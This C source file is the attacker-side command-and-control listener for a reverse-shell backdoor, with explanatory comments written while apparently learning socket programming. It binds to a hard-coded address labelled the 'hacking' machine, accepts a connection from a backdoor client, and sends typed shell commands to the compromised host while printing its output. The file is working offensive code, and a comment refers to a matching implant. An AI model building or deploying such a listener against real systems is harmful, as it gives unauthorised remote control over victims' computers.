#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

/*
 * PERSONAL NOTE
 * basically, socket() returns an integer value of a specific format, which is stored in a variable.
 * until bind() function is used with that socket variable and a sockaddr object, that socket is not
 * associated with the actual server port
 * bind() is only done on server, because on client connect() internally handles client IP/port number, and
 * it does not need to be fixed for the client like it does for the server.
 */

int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384]; // needs to be exact same size as backdoor total_response, or program will have errors
	struct sockaddr_in server_address, client_address; // create two transport address/port structures, for server and backdoor
	int i = 0;
	int optval = 1;
	socklen_t client_length; // type definition for length and size values used by socket-adjacent parameters

	sock = socket(AF_INET, SOCK_STREAM, 0); //define sock as an IPV4 TCP socket

	// attempt to specify that validating address supplied to bind() should allow reuse of local addresses
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error Setting TCP Socket Options!\n");
		exit(1); // exit if setsockopt returns an error
	}

	server_address.sin_family = AF_INET; // transport address structure redundantly specified as IPV4, same as socket value
	server_address.sin_addr.s_addr = inet_addr("192.168.1.166"); // set to "hacking" machine's address
	server_address.sin_port = htons(50005); // set to open port on "hacking" machine
	
	//NOTE - bind takes sockaddr pointer, not sockaddr_in pointer, but cast is fine since the first member of sockaddr_in is a sockaddr object
    
	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address)); // bind server transport address/port to socket value
	listen(sock, 5); // queue up client connection requests, max length 5
	client_length = sizeof(client_address); // sets client_length variable of socklen_t type to the size of the client_address object
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length); // accept first pending connection, store socket value

	while(1)
	{
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // prints out a shell prompt showing client's IP address
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n"); // removes newline character from command stored in buffer
		write(client_socket, buffer, sizeof(buffer)); // sends formatted command to client

		// quit if "q" is entered, otherwise, receive response from client & print it out
		if (strncmp("quit", buffer, 4) == 0)
		{
			break;
		}
		else
		{
			recv(client_socket, response, sizeof(response), MSG_WAITALL); 
			printf("%s", response);
		}
	}
}
